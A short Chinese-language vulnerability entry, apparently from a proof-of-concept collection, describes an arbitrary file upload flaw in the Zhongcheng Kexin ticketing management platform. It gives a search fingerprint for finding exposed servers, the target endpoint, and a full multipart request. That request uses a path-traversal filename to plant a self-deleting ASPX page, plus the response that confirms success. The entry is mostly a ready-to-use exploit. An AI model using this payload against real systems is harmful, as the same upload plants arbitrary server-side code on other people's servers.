# 中成科信票务管理平台UploadFile任意文件上传漏洞

中成科信票务管理平台UploadFile ｜ 文件上传 ｜ —
- **指纹**：`body="SystemManager/SoftwareLicense.htm"`
- **请求**：`POST /api/File/UploadFile HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1SYBNnJoVIXXChBZ
------WebKitFormBoundary1SYBNnJoVIXXChBZ
Content-Disposition: form-data; name="file"; filename="../test123.aspx"
<%@ Page Language="C#"%><% Response.Write("test123"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------WebKitFormBoundary1SYBNnJoVIXXChBZ--
```
- **响应特征**：200 token